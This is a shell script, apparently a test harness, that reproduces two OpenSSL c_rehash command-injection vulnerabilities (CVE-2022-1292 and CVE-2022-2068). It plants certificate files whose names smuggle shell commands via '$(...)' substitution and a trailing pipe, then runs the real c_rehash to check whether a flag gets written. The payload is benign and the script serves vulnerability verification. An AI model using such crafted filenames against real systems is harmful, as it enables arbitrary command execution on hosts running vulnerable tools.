#!/bin/sh
# REAL external invocation of the REAL c_rehash binary.  Usage: entrypoint.sh <original|residual>
#
# Seeds a fresh certificate directory with ONE file whose NAME is the attacker-controlled
# external input (a benign shell-metachar payload that only echoes ${PCB_FLAG} to a file),
# then runs the REAL `c_rehash <dir>` shipped with the compiled OpenSSL.  c_rehash shells out
# to the REAL `openssl` for hashing.  If the command-injection at this version's call site
# fires, the planted ${PCB_FLAG} lands in the injected command's output file.
set -e
export PATH=/opt/ossl/bin:$PATH
FLAVOR="$1"
WORK=/work
rm -rf "$WORK"; mkdir -p "$WORK"

# Generate a genuine, valid self-signed certificate with the REAL built openssl.  The
# "original" (CVE-2022-1292) vector needs a real cert so check_file() returns is_cert=1 and
# link_hash_cert() actually runs the hash-compute exec on the malicious filename.
# Use a self-contained minimal req config (the build installs no system openssl.cnf).
cat > /tmp/req.cnf <<'EOF'
[req]
distinguished_name = dn
prompt = no
[dn]
CN = pcb.test
EOF
openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout /tmp/key.pem -out /tmp/base.pem -days 3650 \
    -config /tmp/req.cnf >/tmp/gen.log 2>&1

cd "$WORK"
if [ "$FLAVOR" = "original" ]; then
  # CVE-2022-1292 filename: command-substitution inside the double-quoted backtick
  # hash-compute call in link_hash_cert (V0).  Real cert content so link_hash_cert runs.
  # perl writes the literal name (no shell expansion of the $(...) at create time).
  perl -e 'my $n=q{z$(echo $PCB_FLAG>orig_out).pem};
           open(my $o,">",$n) or die "create: $!";
           open(my $i,"<","/tmp/base.pem") or die "read base: $!";
           local $/; my $c=<$i>; print $o $c; close $o; close $i;'
else
  # CVE-2022-2068 residual filename: trailing-pipe name -> check_file() 2-arg open runs a
  # shell command (the site the 1.1.1o fix MISSED).  Content irrelevant; only needs to exist
  # and match the *.pem grep so readdir lists it.
  perl -e 'my $n=q{a.pem;echo $PCB_FLAG>resid_out|};
           open(my $f,">",$n) or die "create: $!"; close $f;'
fi

# THE REAL EXTERNAL TRIGGER: run the real c_rehash on the malicious directory.
c_rehash "$WORK" >"$WORK/c_rehash.stdout" 2>"$WORK/c_rehash.stderr" || true

echo "---OSSL_VERSION---";  openssl version
echo "---C_REHASH_PATH---"; command -v c_rehash
echo "---C_REHASH_SHEBANG---"; head -1 "$(command -v c_rehash)"
echo "---SEEDED_FILES---"; ls -1a "$WORK" | grep -v '^\.$' | grep -v '^\.\.$' || true
echo "---ORIG_OUT---";  cat "$WORK/orig_out"  2>/dev/null || echo "(none)"
echo "---RESID_OUT---"; cat "$WORK/resid_out" 2>/dev/null || echo "(none)"
echo "---END---"
